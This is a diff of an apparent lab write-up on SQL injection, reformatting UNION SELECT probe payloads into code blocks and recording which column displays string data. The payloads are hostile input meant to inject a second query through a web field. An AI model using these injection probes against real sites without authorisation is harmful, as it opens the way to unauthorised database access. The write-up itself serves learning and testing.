@@ -87,10 +87,18 @@ After confirming a 3-columm structure, I used a UNION SELECT attack to identify 
 ' UNION SELECT 'Test', NULL, NULL--
 ```
 **Result:** Error (Likely due to a data type mismatch, e.g., the column expects an Integer).
-- **Test 2:** ' UNION SELECT NULL,'Test', NULL--
-Result: Success. The word Test appeared on the webpage
-- **Test 3:** ' UNION SELECT NULL, NULL, 'Test'--
-Result: Error. (Likely due to a data type mismatch again)
+
+- **Payload 2:**
+```
+' UNION SELECT NULL,'Test', NULL--
+```
+**Result:** Success. The word Test appeared on the webpage
+
+- **Payload 3:**
+```
+' UNION SELECT NULL, NULL, 'Test'--
+```
+**Result:** Error. (Likely due to a data type mismatch again)
 
 Only the second column is configured to display string data on the Web Page, making it the necessary injection point for extracting database information.
 
